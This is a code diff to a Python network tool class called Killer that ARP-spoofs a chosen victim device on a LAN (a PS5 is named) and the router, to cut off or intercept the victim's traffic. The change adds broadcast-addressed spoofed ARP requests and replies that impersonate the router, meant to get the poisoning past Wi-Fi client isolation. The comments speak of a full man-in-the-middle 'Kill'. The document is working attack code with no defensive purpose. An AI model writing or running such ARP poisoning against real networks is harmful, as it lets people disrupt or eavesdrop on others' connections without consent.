@@ -943,7 +943,7 @@ class Killer:
             pass
 
     def _poison_frames(self, victim):
-        """Unicast ARP poison only (victim + router).
+        """Unicast ARP poison, plus Wi‑Fi victim-targeted broadcast when isolation drops STA unicast.
 
         Do **not** broadcast gateway impersonation. A ff:ff:ff ARP with
         ``psrc=router`` teaches every listening client that this PC is the
@@ -953,6 +953,10 @@ class Killer:
         victim and router. Many stacks ignore unsolicited unicast replies but
         still cache the sender mapping from a request — reply-only poison was
         too weak after broadcast removal.
+
+        On Wi‑Fi, AP client isolation often drops STA-to-STA *unicast*, so the
+        PS5 never sees those frames and Kill does nothing. Add victim-targeted
+        L2 broadcast copies (pdst/hwdst still this victim only — not a GARP).
         """
         # Victim: "router is at PC MAC"
         to_victim_req = Ether(dst=victim['mac']) / ARP(
@@ -986,7 +990,7 @@ class Killer:
         )
         # Router ARP recovers faster from direct victim frames — send router-side
         # poison twice per burst so inbound MITM (full Kill) holds with outbound.
-        return [
+        frames = [
             to_victim_req,
             to_victim_reply,
             to_router_req,
@@ -994,6 +998,35 @@ class Killer:
             to_router_req,
             to_router_reply,
         ]
+        try:
+            from tools.mitm_probe import iface_is_wireless
+
+            wifi = iface_is_wireless(self.iface)
+        except Exception:
+            wifi = False
+        if wifi:
+            bcast = 'ff:ff:ff:ff:ff:ff'
+            frames.extend(
+                [
+                    Ether(dst=bcast)
+                    / ARP(
+                        op=1,
+                        psrc=self.router['ip'],
+                        hwsrc=self.iface.mac,
+                        pdst=victim['ip'],
+                        hwdst=victim['mac'],
+                    ),
+                    Ether(dst=bcast)
+                    / ARP(
+                        op=2,
+                        psrc=self.router['ip'],
+                        hwsrc=self.iface.mac,
+                        pdst=victim['ip'],
+                        hwdst=victim['mac'],
+                    ),
+                ]
+            )
+        return frames
 
     def _poison_arp_now(self, victim, seq=0, repeats=1, delay_s=0.0):
         """Best-effort immediate ARP poison burst; aborts if a newer op supersedes this sequence.
